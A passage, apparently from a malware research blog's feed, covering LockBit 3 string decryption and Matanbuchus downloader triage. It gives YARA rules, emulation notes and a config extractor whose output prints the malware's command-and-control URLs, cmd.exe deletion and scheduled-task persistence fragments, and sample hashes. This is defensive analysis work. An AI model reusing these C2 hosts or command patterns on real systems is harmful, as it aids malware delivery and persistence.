% 4)!= 0: return None for i in range(0, len(data), 4): dword = struct.unpack(&#39;&lt;I&#39;, data[i:i+4])[0] dword = (~(dword ^ decryption_key) &amp; 0xffffffff) result += dword.to_bytes(4, byteorder=&#39;little&#39;) return result def get_strings(file_data): out = {} egg = br&#39; xc7[ x00- x07](....)(?P&lt;raw&gt;(?: xc7[ x40- x47].....){1,})&#39; for match in re.finditer(egg, file_data): data_offset = match.start() tmp_data = b&#39;&#39; tmp_data += match.group(1) g2 = match.group(2) split_key = g2[:2] for s in g2.split(split_key): tmp_data += s[-4:] ptxt_data = decrypt_str(tmp_data, decryption_key) if ptxt_data[-2:] == b&#39; x00 x00&#39;: ptxt_data = ptxt_data.decode(&#39;utf-16le&#39;) elif len(ptxt_data) == 16: if any(not c for c in ptxt_data[::2]): ptxt_data = str(uuid.UUID(bytes_le=ptxt_data)) if type(ptxt_data) == str: ptxt_data = ptxt_data.replace(&#39; x00&#39;,&#39;&#39;) else: ptxt_data = ptxt_data.replace(b&#39; x00&#39;,b&#39;&#39;) try: ptxt_data = ptxt_data.decode(&#39;utf-8&#39;) except: continue out[data_offset] = ptxt_data return out get_strings(file_data) . {2914: &#39; *.dll&#39;, 3104: &#39;drv&#39;, 5184: &#39;/C DEL /F /Q &#39;, 5280: &#39; &gt;&gt; NUL&#39;, 5371: &#39; cmd.exe&#39;, 6137: &#39;%s_IPC$&#39;, 6283: &#39;{%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}&#39;, 6619: &#39; %s.%s &#39;, 6743: &#39; . pipe %s&#39;, 7043: &#39;TMP&#39;} . IDA Python Script to Label Strings . string_map = {} def set_hexrays_comment(address, text): &#39;&#39;&#39; set comment in decompiled code &#39;&#39;&#39; cfunc = idaapi.decompile(address) tl = idaapi.treeloc_t() tl.ea = address tl.itp = idaapi.ITP_SEMI cfunc.set_user_cmt(tl, text) cfunc.save_user_cmts() def set_comment(address, text): ## Set in dissassembly idc.set_cmt(address, text,0) ## Set in decompiled data set_hexrays_comment(address, text) for offset,string_value in string_map.items(): va = idaapi.get_fileregion_ea(offset) set_comment(va, string_value) . Functionality . The binary opens a named pipe with a generated name (same as the other embeded binary). . 0 . _IPC$ . pipe {GUID} Then a handle to the explorer.exe or lsass.exe process is opened and the named pipe handle is duplicated into the process. This is a trick that keeps the named pipe open indefinitely possibly a version of this trick. . Analysis of The 3rd PE . Sample: 917e115cc403e29b4388e0d175cbfac3e7e40ca1742299fbdb353847db2de7c2 . Obfuscation . This sample is obfuscated even once it has been decrypted and decompressed. Lockbit writes it to a temporary file in %APPDATA% then launches it as a suspended process. The supended process memory is then deobfuscated and the processes is then allowed to execute. . TODO: deobfuscate and dump process for further analysis . &lt;/div&gt;",
            "url": "https://research.openanalysis.net/lockbit/lockbit3/yara/triage/ransomware/2022/07/07/lockbit3.html",
            "relUrl": "/lockbit/lockbit3/yara/triage/ransomware/2022/07/07/lockbit3.html",
            "date": " • Jul 7, 2022"
        }
        
    
  
    
        ,"post1": {
            "title": "Matanbuchus Triage Notes",
            "content": ". Overview . Matanbuchus is a malware downloader that has been observed as the final loading stage in multiple phishing campaigns. There are two components, a Matanbuchus loader intented to load the Matanbuchus downloader. Once the downloader is executed it makes an HTTP request to the C2 with some victim info, and downloads the final payload. . According to DCSO CyTec... . Matanbuchus is the name given to a Malware-as-a-Service sold on Russian-speaking cybercriminal forums. Starting at a rental price of $2,500, the malware consists of an obfuscated two-stage loader which has been deployed in conjunction with Qakbot and Cobalt Strike payloads. . . References . Malspam pushes Matanbuchus malware, leads to Cobalt Strike | Not Packed (UnpacMe) | f8cc2cf36e193774f13c9c5f23ab777496dcd7ca588f4f73b45a7a5ffa96145e | Matanbuchus: Malware-as-a-Service with Demonic Intentions | A deal with the devil: Analysis of a recent Matanbuchus sample | MATANBUCHUS: Another Loader As A Service Malware | List of known versions of Windows DLLs | Free Yara Scan Service | MalwareBazaar Client | . Analysis . The DLL has an export called HackCheck that uses OutputDebugStringA to print start dll HackCheck | The sample uses API hashing with FNV1a hash algo to resolve API calls | . Yara Rule . This yara rule is very brittle and needs lots of testing/refining . rule matanbuchus { meta: description = &quot;Identifies matanbuchus&quot; strings: // recursive fnv1 hash // 69 C2 93 01 00 01 imul eax, edx, 1000193h // 50 push eax // B9 01 00 00 00 mov ecx, 1 // C1 E1 00 shl ecx, 0 $x1 = { 69 c2 93 01 00 01 50 b9 01 00 00 00 c1 e1 00 } // string decryption // 0F BE 1C 01 movsx ebx, byte ptr [ecx+eax] // 33 DE xor ebx, esi // 6A 00 push 0 // 6A 01 push 1 $x2 = { 0f be 1c 01 33 de 6a 00 6a 01 } condition: all of ($x*) } . Yara Rule Revised . rule matanbuchus { meta: description = &quot;Identifies matanbuchus&quot; strings: // fnv1 hash // 69 C2 93 01 00 01 imul eax, edx, 1000193h // // 69 C0 93 01 00 01 imul eax, 1000193h $x1 = { 69 ?? 93 01 00 01 } //pe loader $x2 = { B8 4D 5A 00 00 } $x3 = { 81 38 50 45 00 00 } //InternetCloseHandle $x5 = { 66 E9 DD 4D } //InternetOpenUrlA $x6 = { BC 8B CF F4 } //InternetCheckConnectionA $x7 = { 3F 82 58 52 } //InternetReadFile $x8 = { 66 E9 DD 4D } condition: all of ($x*) } . String Decryption . Simple Decryption . Some strings are built as stack strings then copied into a buffer and returned from a function. The returned buffer is then decrypted directly using a simple XOR decryption routine where the first byte is the key. . import struct data = b&#39;jl8|tt8Py{s[p}{s&#39; key = struct.pack(&#39;&lt;I&#39;,0x796C6B18) data = key[1:] + data out = [] for i in data: out.append(i ^ key[0]) bytes(out) . b&#39;start dll HackCheck&#39; . def unhex(hex_string): import binascii if type(hex_string) == str: return binascii.unhexlify(hex_string.encode(&#39;utf-8&#39;)) else: return binascii.unhexlify(hex_string) def tohex(data): import binascii if type(data) == str: return binascii.hexlify(data.encode(&#39;utf-8&#39;)) else: return binascii.hexlify(data) . Complex Decryption . Other strings are also build from stack strings in a function and returned in a buffer, but these strings are decrypted with a second function call to a decryption function. To handle these more complex strings, we will use dumpulator . from dumpulator import Dumpulator import struct import re import pefile file_data = open(&#39;/tmp/mat.bin&#39;,&#39;rb&#39;).read() pe = pefile.PE(data=file_data) . dp = Dumpulator(&quot;/tmp/mat.dmp&quot;, quiet=True) fn_get_string = 0x708641C0 ss_start = 0x708631B2 ss_end = 0x708632AA dp.start(ss_start, end=ss_end) ss = dp.read(dp.regs.ebp-0x50, 0x48) ss = bytes(ss)[:0x3e] buff = dp.allocate(0x3e) dp.write(buff, ss) fn_dec_str = 0x7086F3D0 dp.call(fn_dec_str, [buff, 0x3e, 0x0, 0x7ebbfa3, 0x1010101]) dp.read(buff,0x3e) . Failed to read module data . bytearray(b&#39;https://telemetrysystemcollection.com/m8YYdu/mCQ2U9/auth.aspx x00&#39;) . Dumpulator Notes . The DLL uses thread safe functions that require a call into EnterCriticalSection and LeaveCriticalSection. Because our dump was taken before the DLL was initialized the critical section object was not initialized and this causes Dumpulator to crash. . First we tried just calling the initialization function in the DLL to setup this object (also tried calling the wrapper functions for InitializeCriticalSectionEx) but these all led to crashes (we could implement some syscalls and try again but we are lazy! . Our solution is to just patch out the EnterCriticalSection and LeaveCriticalSection calls in the loaded ntdll using a simple return 0. . 33 C0 xor eax,eax C2 04 00 ret 4 . Dumpulator Patching Out Functions . dp = Dumpulator(&quot;/tmp/mat.dmp&quot;, quiet=True) ntdll_start = 0x77a10000 patch_bytes = b&#39; x33 xC0 xC2 x04 x00&#39; ptr_RtlLeaveCriticalSection = 0x77A5FFF0 ptr_RtlEnterCriticalSection = 0x77A5FDF0 get_str_fn = 0x70861000 #tohex(dp.read(ntdll_init_crit_sec,10)) dp.write(ptr_RtlLeaveCriticalSection, patch_bytes) dp.write(ptr_RtlEnterCriticalSection, patch_bytes) dp.call(get_str_fn) . Failed to read module data unmapped read from 8[4], cip = 77a6693a error: Invalid memory read (UC_ERR_READ_UNMAPPED), cip = 77a6693a . 134217727 . Dumpulator Implementing Syscalls to Load DLL . Our patching method sort of worked but there is other initializations stuff that was causing more crashes. We are going to try and just implement the syscalls that we need to actually emulate the full DLL load routine and see if that works better. . from dumpulator import Dumpulator, syscall from dumpulator.native import * @syscall def ZwQueryVolumeInformationFile(dp: Dumpulator, FileHandle: HANDLE, IoStatusBlock: P(IO_STATUS_BLOCK), FsInformation: PVOID, Length: ULONG, FsInformationClass: FSINFOCLASS ): return STATUS_SUCCESS dp = Dumpulator(&quot;/tmp/mat2.dmp&quot;, quiet=True) dll_base_addr = 0x71950000 dp.start(dp.regs.eip, end=dp.read_ptr(dp.regs.esp)) get_str_fn = 0x71951000 dp.read_str(dp.call(get_str_fn)) . Failed to read module data . &#39;https://telemetrysystemcollection.com/m8YYdu/mCQ2U9/auth.aspx&#39; . Finding Encrypted Stack Strings . egg = rb&#39;( xC6 x45..){4}&#39; egg = rb&#39; x55 x8b xec x83 xec x08 x33 xc0 x88 x45 xff&#39; stack_string_offsets = [] for m in re.finditer(egg, file_data): fn_offset = m.start() fn_addr = pe.get_rva_from_offset(fn_offset) + dll_base_addr tmp_str = dp.read_str(dp.call(fn_addr)) print(tmp_str) . https://telemetrysystemcollection.com/m8YYdu/mCQ2U9/auth.aspx https://collectiontelemetrysystem.com/m8YYdu/mCQ2U9/auth.aspx DllRegisterServer http://collectiontelemetrysystem.com/m8YYdu/mCQ2U9/home.aspx http://telemetrysystemcollection.com/m8YYdu/mCQ2U9/home.aspx https://telemetrysystemcollection.com/m8YYdu/mCQ2U9/home.aspx . Revising Our Config Extractor . Now that we have a base config extractor we need to test this across multiple samples/versions of the malware to make sure it is robust enough. . Our initial sample was f8cc2cf36e193774f13c9c5f23ab777496dcd7ca588f4f73b45a7a5ffa96145e. . We have collected the following samples to triage: . b9b399dbb5d901c16d97b7c30cc182736cd83a7c53313194a1798d61f9c7501e | c41f7b7ec0909d5c21107ddebc2fe84dbc137f701b42943c1a5e69f5d50e05ab | b4e7710488c2b7aaa71688b8bd546410af07a215c2e835e8dfbe24887186bd4f | 60f030597c75f9df0f7a494cb5432b600d41775cfe5cf13006c1448fa3a68d8d | 58a673023bbc7f2726e3b7ac917a43d9306692dc87b638ee21b98705a3262ccd | 4b87f95c4477fc66c58b8e16a74f9c47217913cb4a78dc69f27a364a099acd90 | 4eb85a5532b98cbc4a6db1697cf46b9e2b7e28e89d6bbfc137b36c0736cd80e2 | . More samples from Rattle (these work with our existing tools) . 67a9e8599ab71865a97e75dae9be438c24d015a93e6a12fb5b450ec558528290 | 075c904c5e18cd49f7d48f0fd1fc67d0921d51c7effb9233a3c92fbfa4f218ed | 60f030597c75f9df0f7a494cb5432b600d41775cfe5cf13006c1448fa3a68d8d | . These samples don&#39;t work with our first version of the config extractor: . e58b9bbb7bcdf3e901453b7b9c9e514fed1e53565e3280353dccc77cde26a98e.bin | b9b399dbb5d901c16d97b7c30cc182736cd83a7c53313194a1798d61f9c7501e.bin | . New Config Extractor - Static String Decryption Notes . def unhex(hex_string): import binascii if type(hex_string) == str: return binascii.unhexlify(hex_string.encode(&#39;utf-8&#39;)) else: return binascii.unhexlify(hex_string) def tohex(data): import binascii if type(data) == str: return binascii.hexlify(data.encode(&#39;utf-8&#39;)) else: return binascii.hexlify(data) . import re import struct import pefile FILE_PATH = &#39;/tmp/samples/e58b9bbb7bcdf3e901453b7b9c9e514fed1e53565e3280353dccc77cde26a98e.bin&#39; FILE_PATH = &#39;/tmp/samples/orig.bin&#39; FILE_PATH = &#39;/tmp/samples/bd_rony.bin&#39; file_data = open(FILE_PATH,&#39;rb&#39;).read() def xor_decrypt(data, key): out = [] for i in range(len(data)): out.append(data[i] ^ key[i%len(key)]) return bytes(out) def is_ascii(data): return re.match(B&quot;^[ s!-~]+ 0*$&quot;, data) is not None def filter(data): return re.match(rb&#39;[ f v t]&#39;, data) is not None stack_strings = [] #string_egg = rb&#39;( xC6 x45..){2,}&#39; string_egg = rb&#39;(?P&lt;a&gt;(?: xC6 x85.{5}){0,})(?P&lt;b&gt;(?: xC6 x45..){1,})&#39; for m in re.finditer(string_egg, file_data): match_data = m.group(0) #stack_strings.append({&quot;data&quot;:match_data.replace(b&#39; xC6 x45&#39;,b&#39;&#39;)[1::2], &quot;match&quot;:match_data}) stack_strings.append({&quot;data&quot;:m[&#39;a&#39;][6::7] + m[&#39;b&#39;][3::4], &quot;match&quot;:match_data}) keys = [] key_byte_len_egg = rb&#39; x68(....) x68(....) x6a x00 x6a(.)&#39; for m in re.finditer(key_byte_len_egg, file_data): keys.append( {&#39;key&#39;:m.group(2) + m.group(1), &#39;length&#39;:ord(m.group(3))}) key_dw_len_egg = rb&#39; x68(....) x68(....) x6a x00 x68(....)&#39; for m in re.finditer(key_dw_len_egg, file_data): keys.append( {&#39;key&#39;:m.group(2) + m.group(1), &#39;length&#39;:struct.unpack(&#39;&lt;I&#39;,m.group(3))[0]}) for sj in stack_strings: s = sj.get(&#39;data&#39;) str_len = len(s) if str_len &lt; 5: continue #print(f&quot; n n{str_len}&quot;) flag_found = False #print(&#39; n&#39;) #print(f&#39;{tohex(sj.get(&quot;match&quot;))}&#39;) tmp_strings = [] for k in keys: if k.get(&#39;length&#39;) == str_len: #print(f&quot;found key: {tohex(k.get(&#39;key&#39;))}&quot;) out = xor_decrypt(s, k.get(&#39;key&#39;)) if is_ascii(out) and not filter(out): tmp_strings.append(out) flag_found = True if not flag_found: tmp_xoe_dec = xor_decrypt(s[1:-1], bytes([s[0]])) if is_ascii(tmp_xoe_dec) and not filter(tmp_xoe_dec): print(tmp_xoe_dec) else: #print(f&quot; n{tmp_strings}&quot;) spec_char_egg = rb&#39;[^A-Za-z0-9 s ./ %]{1}&#39; best_match = min( (len(re.findall(spec_char_egg, s)),s) for s in tmp_strings )[1] print(best_match) . b&#39;Content-Length: x00&#39; b&#39;C: Windows System32 WindowsPowerShell v1.0 powershell.exe x00&#39; b&#39;collectiontelemetrysystem.com x00&#39; b&#39;DllRegisterServer x00&#39; b&#39;097f5m x00&#39; b&#39;Running dll in memory #3 (DllInstall(Unstall)) x00&#39; b&#39;runas x00&#39; b&#39;.exe x00&#39; b&#39;timeout /t 3 &amp;&amp; move /Y x00&#39; b&#39;Running dll in memory #3 (DllInstall(Install)) x00&#39; b&#39;.exe x00&#39; b&#39;.exe x00&#39; b&#39;TiC7 x00&#39; b&#39;.nls x00&#39; b&#39;Run PS in memory x00&#39; b&#39;Admin x00&#39; b&#39;%LOCALAPPDATA% x00&#39; b&#39;DllInstall x00&#39; b&#39;cmd.exe /c x00&#39; b&#39;collectiontelemetrysystem.com x00&#39; b&#39;Not in domain x00&#39; b&#39;regsvr32.exe x00&#39; b&#39;%PROCESSOR_REVISION% x00&#39; b&#39;%APPDATA% x00&#39; b&#39;41.4.0 x00&#39; b&#39;8QN04 x00&#39; b&#39;64 Bit x00&#39; b&#39;8S2x x00&#39; b&#39;Starting the exe with parameters x00&#39; b&#39;C: Windows System32 cmd.exe /c x00&#39; b&#39;cmd.exe /c x00&#39; b&#39;High start exe x00&#39; b&#39;Running exe x00&#39; b&#39;User-Agent: x00&#39; b&#39;%PROCESSOR_REVISION% x00&#39; b&#39;Content-Type: application/x-www-form-urlencoded x00&#39; b&#39;%APPDATA% x00&#39; b&#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/ x00&#39; b&#39; explorer.exe x00&#39; b&#39;MemLoadDllMain || MemLoadExe x00&#39; b&#39;Run CMD in memory x00&#39; b&#39;3CEk x00&#39; b&#39;3m7x x00&#39; b&#39;.nls x00&#39; b&#39;%APPDATA% x00&#39; b&#39;NCST x00&#39; b&#39;BCha x00&#39; b&#34;/c ECHO &#39;You must restart the program to resolve a critical error!&#39; &amp;&amp; start x00&#34; b&#39;7eriel x00&#39; b&#39;%APPDATA% x00&#39; b&#39;.nls x00&#39; b&#39;%PROCESSOR_REVISION% x00&#39; b&#34; &#39;z{VIS rA6 rb x00&#34; b&#39;%LOCALAPPDATA% x00&#39; b&#39;IsWow64Process x00&#39; b&#39;rundll32.exe x00&#39; b&#39;%PROCESSOR_REVISION% x00&#39; b&#39;kernel32 x00&#39; b&#39;%PROCESSOR_REVISION% x00&#39; b&#39;.nls x00&#39; b&#39;User x00&#39; b&#39;%PROCESSOR_REVISION% x00&#39; b&#39;.nls x00&#39; b&#39; r n r n x00&#39; b&#39; rXOGONSEzBER% x00&#39; b&#39;%PROCESSOR_REVISION% x00&#39; b&#39; nost: x00&#39; b&#39;MemLoadShellCode x00&#39; b&#39;Q6X6 x00&#39; b&#39;timeout /t 3 &amp;&amp; del x00&#39; b&#39;cmd.exe x00&#39; b&#39;%02X-%02X-%02X-%02X-%02X-%02X x00&#39; b&#39;Running dll in memory #2 (DllRegisterServer) x00&#39; b&#39;Crypt update &amp; Bots upgrade x00&#39; b&#39;timeout /t 3 &amp;&amp; del x00&#39; b&#39;3fe11 x00&#39; b&#39;%PROCESSOR_ARCHITECTURE% x00&#39; b&#39;%PROCESSOR_ARCHITECTURE% x00&#39; b&#39;NSeyDX x00&#39; b&#39;%APPDATA% x00&#39; b&#39;4nes x00&#39; b&#39;jpofxs x00&#39; b&#39;Not in domain x00&#39; b&#39;DllInstall x00&#39; b&#39; &amp;&amp; rd /s /q x00&#39; b&#39; &amp;&amp; regsvr32.exe -e &#34; x00&#39; b&#39;32 Bit x00&#39; b&#39;%USERDOMAIN% x00&#39; . Final Config Decryptor . import re import struct import pefile def xor_decrypt(data, key): out = [] for i in range(len(data)): out.append(data[i] ^ key[i%len(key)]) return bytes(out) def is_ascii(data): return re.match(B&quot;^[ s!-~]+ 0*$&quot;, data) is not None def get_strings(file_path): file_data = open(file_path,&#39;rb&#39;).read() stack_strings = [] #string_egg = rb&#39;( xC6 x45..){2,}&#39; string_egg = rb&#39;(?P&lt;a&gt;(?: xC6 x85.{5}){0,})(?P&lt;b&gt;(?: xC6 x45..){3,})&#39; for m in re.finditer(string_egg, file_data): match_data = m.group(0) #stack_strings.append({&quot;data&quot;:match_data.replace(b&#39; xC6 x45&#39;,b&#39;&#39;)[1::2], &quot;match&quot;:match_data}) stack_strings.append({&quot;data&quot;:m[&#39;a&#39;][6::7] + m[&#39;b&#39;][3::4], &quot;match&quot;:match_data}) keys = [] key_byte_len_egg = rb&#39; x68(....) x68(....) x6a x00 x6a(.)&#39; for m in re.finditer(key_byte_len_egg, file_data): keys.append( {&#39;key&#39;:m.group(2) + m.group(1), &#39;length&#39;:ord(m.group(3))}) key_dw_len_egg = rb&#39; x68(....) x68(....) x6a x00 x68(....)&#39; for m in re.finditer(key_dw_len_egg, file_data): keys.append( {&#39;key&#39;:m.group(2) + m.group(1), &#39;length&#39;:struct.unpack(&#39;&lt;I&#39;,m.group(3))[0]}) out_strings = [] for sj in stack_strings: s = sj.get(&#39;data&#39;) str_len = len(s) flag_found = False tmp_out = [] for k in keys: if k.get(&#39;length&#39;) == str_len: out = xor_decrypt(s, k.get(&#39;key&#39;)) if is_ascii(out): tmp_out.append(out) if len(tmp_out) == 0: out = xor_decrypt(s[1:-1], bytes([s[0]])) if is_ascii(out): out_strings.append(out) elif len(tmp_out) == 1: out_strings.append(tmp_out[0]) else: # This is a hack # We have strings that will give valid ascii for multiple keys # So far these have only been dll names for out in tmp_out: if out[:-3].lower() == b&#39;dll&#39;: out_strings.append(out) break return list(set(out_strings)) . Test All Samples . get_strings(FILE_PATH) import os for filename in os.listdir(&#39;/tmp/samples&#39;): if filename.endswith(&quot;.bin&quot;): file_path = os.path.join(&#39;/tmp/samples&#39;, filename) print(f&quot; n{file_path}&quot;) print(get_strings(file_path)) . /tmp/samples/55d329a13da236bec15c4c67686b809a2fbf5f6c9625b62d900ac22a7b729ba9.bin [b&#39;VirtualAlloc&#39;, b&#39;Windows-Update-Agent/11.0.10011.16384 Client-Protocol/2.0 x00&#39;, b&#39;rundll32.exe x00&#39;, b&#39;9npSEGB3kg9suo3Yit x00&#39;, b&#39;kernel32.dll&#39;, b&#39;https://azure-dbupdate.at/vuUwUx/FyNRoM/index.php x00&#39;, b&#39;Shlwapi.dll x00&#39;, b&#39;WS2_32.dll x00&#39;, b&#39;DllRegisterServer x00&#39;, b&#39;loaddll32.exe x00&#39;, b&#39;Shell32.dll x00&#39;, b&#39;Wininet.dll x00&#39;, b&#39;USER32.dll x00&#39;, b&#39;GetProcAddress&#39;, b&#39;LoadLibraryA&#39;, b&#39;IPHLPAPI.DLL x00&#39;, b&#39;https://azure-dbupdate.at/vuUwUx/FyNRoM/auth.php x00&#39;, b&#39;https://azure-updatedb.at/vuUwUx/FyNRoM/index.php x00&#39;, b&#39;VirtualFree&#39;, b&#39;regsvr32.exe x00&#39;, b&#39;%PROCESSOR_LEVEL%&#39;] /tmp/samples/4b87f95c4477fc66c58b8e16a74f9c47217913cb4a78dc69f27a364a099acd90.bin [b&#39;VirtualAlloc&#39;, b&#39;Windows-Update-Agent/11.0.10011.16384 Client-Protocol/2.0 x00&#39;, b&#39;rundll32.exe x00&#39;, b&#39;9npSEGB3kg9suo3Yit x00&#39;, b&#39;kernel32.dll&#39;, b&#39;https://azure-dbupdate.at/vuUwUx/FyNRoM/index.php x00&#39;, b&#39;Shlwapi.dll x00&#39;, b&#39;WS2_32.dll x00&#39;, b&#39;DllRegisterServer x00&#39;, b&#39;loaddll32.exe x00&#39;, b&#39;Shell32.dll x00&#39;, b&#39;Wininet.dll x00&#39;, b&#39;USER32.dll x00&#39;, b&#39;GetProcAddress&#39;, b&#39;LoadLibraryA&#39;, b&#39;IPHLPAPI.DLL x00&#39;, b&#39;https://azure-dbupdate.at/vuUwUx/FyNRoM/auth.php x00&#39;, b&#39;https://azure-updatedb.at/vuUwUx/FyNRoM/index.php x00&#39;, b&#39;VirtualFree&#39;, b&#39;regsvr32.exe x00&#39;, b&#39;%PROCESSOR_LEVEL%&#39;] /tmp/samples/0bdf1060b85ad55e73393eb0b59c1d226e091da4f4dcce65dacba5e9a1fd76a7.bin [b&#39;VirtualAlloc&#39;, b&#39;start dll HackCheck&#39;, b&#39;http://collectiontelemetrysystem.com/m8YYdu/mCQ2U9/home.aspx x00&#39;, b&#39;https://telemetrysystemcollection.com/m8YYdu/mCQ2U9/auth.aspx x00&#39;, b&#39;rundll32.exe x00&#39;, b&#39;kernel32.dll&#39;, b&#39;Shlwapi.dll x00&#39;, b&#39;WS2_32.dll x00&#39;, b&#39;DllRegisterServer x00&#39;, b&#39;loaddll32.exe x00&#39;, b&#39;Shell32.dll x00&#39;, b&#39;Wininet.dll x00&#39;, b&#39;USER32.dll x00&#39;, b&#39;GetProcAddress&#39;, b&#39;Netapi32.dll x00&#39;, b&#39;LoadLibraryA&#39;, b&#39;http://telemetrysystemcollection.com/m8YYdu/mCQ2U9/home.aspx x00&#39;, b&#39;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/8.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; Microsoft Outlook 16.0.5197; ms-office; MSOffice 16) x00&#39;, b&#39;IPHLPAPI.DLL x00&#39;, b&#39;Wkscli.dll x00&#39;, b&#39;https://telemetrysystemcollection.com/m8YYdu/mCQ2U9/home.aspx x00&#39;, b&#39;VirtualFree&#39;, b&#39;https://collectiontelemetrysystem.com/m8YYdu/mCQ2U9/auth.aspx x00&#39;, b&#39;%PROCESSOR_LEVEL%&#39;] /tmp/samples/3cae2ce9b2d7040292f1661af63dc28e778027c46f78d8be3b1d43f4b6c2b046.bin [b&#39;VirtualAlloc&#39;, b&#39;Windows-Update-Agent/11.0.10011.16384 Client-Protocol/2.0 x00&#39;, b&#39;rundll32.exe x00&#39;, b&#39;9npSEGB3kg9suo3Yit x00&#39;, b&#39;kernel32.dll&#39;, b&#39;https://azure-dbupdate.at/vuUwUx/FyNRoM/index.php x00&#39;, b&#39;Shlwapi.dll x00&#39;, b&#39;WS2_32.dll x00&#39;, b&#39;DllRegisterServer x00&#39;, b&#39;loaddll32.exe x00&#39;, b&#39;Shell32.dll x00&#39;, b&#39;Wininet.dll x00&#39;, b&#39;USER32.dll x00&#39;, b&#39;GetProcAddress&#39;, b&#39;LoadLibraryA&#39;, b&#39;IPHLPAPI.DLL x00&#39;, b&#39;https://azure-dbupdate.at/vuUwUx/FyNRoM/auth.php x00&#39;, b&#39;https://azure-updatedb.at/vuUwUx/FyNRoM/index.php x00&#39;, b&#39;VirtualFree&#39;, b&#39;regsvr32.exe x00&#39;, b&#39;%PROCESSOR_LEVEL%&#39;] /tmp/samples/b4e7710488c2b7aaa71688b8bd546410af07a215c2e835e8dfbe24887186bd4f.bin [b&#39;VirtualAlloc&#39;, b&#39;Windows-Update-Agent/11.0.10011.16384 Client-Protocol/2.0 x00&#39;, b&#39;rundll32.exe x00&#39;, b&#39;9npSEGB3kg9suo3Yit x00&#39;, b&#39;kernel32.dll&#39;, b&#39;https://azure-dbupdate.at/vuUwUx/FyNRoM/index.php x00&#39;, b&#39;Shlwapi.dll x00&#39;, b&#39;WS2_32.dll x00&#39;, b&#39;DllRegisterServer x00&#39;, b&#39;loaddll32.exe x00&#39;, b&#39;Shell32.dll x00&#39;, b&#39;Wininet.dll x00&#39;, b&#39;USER32.dll x00&#39;, b&#39;GetProcAddress&#39;, b&#39;LoadLibraryA&#39;, b&#39;IPHLPAPI.DLL x00&#39;, b&#39;https://azure-dbupdate.at/vuUwUx/FyNRoM/auth.php x00&#39;, b&#39;https://azure-updatedb.at/vuUwUx/FyNRoM/index.php x00&#39;, b&#39;VirtualFree&#39;, b&#39;regsvr32.exe x00&#39;, b&#39;%PROCESSOR_LEVEL%&#39;] /tmp/samples/orig.bin [b&#39;VirtualAlloc&#39;, b&#39;start dll HackCheck&#39;, b&#39;http://collectiontelemetrysystem.com/m8YYdu/mCQ2U9/home.aspx x00&#39;, b&#39;https://telemetrysystemcollection.com/m8YYdu/mCQ2U9/auth.aspx x00&#39;, b&#39;rundll32.exe x00&#39;, b&#39;kernel32.dll&#39;, b&#39;Shlwapi.dll x00&#39;, b&#39;WS2_32.dll x00&#39;, b&#39;DllRegisterServer x00&#39;, b&#39;loaddll32.exe x00&#39;, b&#39;Shell32.dll x00&#39;, b&#39;Wininet.dll x00&#39;, b&#39;USER32.dll x00&#39;, b&#39;GetProcAddress&#39;, b&#39;Netapi32.dll x00&#39;, b&#39;LoadLibraryA&#39;, b&#39;http://telemetrysystemcollection.com/m8YYdu/mCQ2U9/home.aspx x00&#39;, b&#39;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/8.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; Microsoft Outlook 16.0.5197; ms-office; MSOffice 16) x00&#39;, b&#39;IPHLPAPI.DLL x00&#39;, b&#39;Wkscli.dll x00&#39;, b&#39;https://telemetrysystemcollection.com/m8YYdu/mCQ2U9/home.aspx x00&#39;, b&#39;VirtualFree&#39;, b&#39;https://collectiontelemetrysystem.com/m8YYdu/mCQ2U9/auth.aspx x00&#39;, b&#39;%PROCESSOR_LEVEL%&#39;] /tmp/samples/2f36c571f20b2b2c2058d4db574a6d53b148450356bf529d72aefc19505c912e.bin [b&#39;VirtualAlloc&#39;, b&#39;Windows-Update-Agent/11.0.10011.16384 Client-Protocol/2.0 x00&#39;, b&#39;rundll32.exe x00&#39;, b&#39;9npSEGB3kg9suo3Yit x00&#39;, b&#39;kernel32.dll&#39;, b&#39;https://azure-dbupdate.at/vuUwUx/FyNRoM/index.php x00&#39;, b&#39;Shlwapi.dll x00&#39;, b&#39;WS2_32.dll x00&#39;, b&#39;DllRegisterServer x00&#39;, b&#39;loaddll32.exe x00&#39;, b&#39;Shell32.dll x00&#39;, b&#39;Wininet.dll x00&#39;, b&#39;USER32.dll x00&#39;, b&#39;GetProcAddress&#39;, b&#39;LoadLibraryA&#39;, b&#39;IPHLPAPI.DLL x00&#39;, b&#39;https://azure-dbupdate.at/vuUwUx/FyNRoM/auth.php x00&#39;, b&#39;https://azure-updatedb.at/vuUwUx/FyNRoM/index.php x00&#39;, b&#39;VirtualFree&#39;, b&#39;regsvr32.exe x00&#39;, b&#39;%PROCESSOR_LEVEL%&#39;] /tmp/samples/4eb85a5532b98cbc4a6db1697cf46b9e2b7e28e89d6bbfc137b36c0736cd80e2.bin [b&#39;rundll32.exe x00&#39;, b&#39;ztCYGAuJ x00&#39;, b&#39;Shlwapi.dll x00&#39;, b&#39;WS2_32.dll x00&#39;, b&#39;https://windowsdriverupdate.at/V.asp x00&#39;, b&#39;DllRegisterServer x00&#39;, b&#39;Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.13127; Pro) x00&#39;, b&#39;Shell32.dll x00&#39;, b&#39;Wininet.dll x00&#39;, b&#39;USER32.dll x00&#39;, b&#39;https://windowsdriverupdate.at/ZBEr.asp x00&#39;, b&#39;Dll Uinstall x00&#39;, b&#39;%PROCESSOR_LEVEL% x00&#39;, b&#39;https://driverwindowsupdate.at/V.asp x00&#39;, b&#39;UnregisterServer x00&#39;, b&#39;IPHLPAPI.DLL x00&#39;, b&#39;%PROCESSOR_REVISION% x00&#39;, b&#39;regsvr32.exe x00&#39;, b&#39;&#34;C: Windows system32 schtasks.exe&#34; /Create /SC MINUTE /MO 1 /TN x00&#39;] /tmp/samples/10d5483faf9a4e0fbc17556164f47f7014650797b7d501289b269515a0853b64.bin [b&#39;VirtualAlloc&#39;, b&#39;Windows-Update-Agent/11.0.10011.16384 Client-Protocol/2.0 x00&#39;, b&#39;rundll32.exe x00&#39;, b&#39;9npSEGB3kg9suo3Yit x00&#39;, 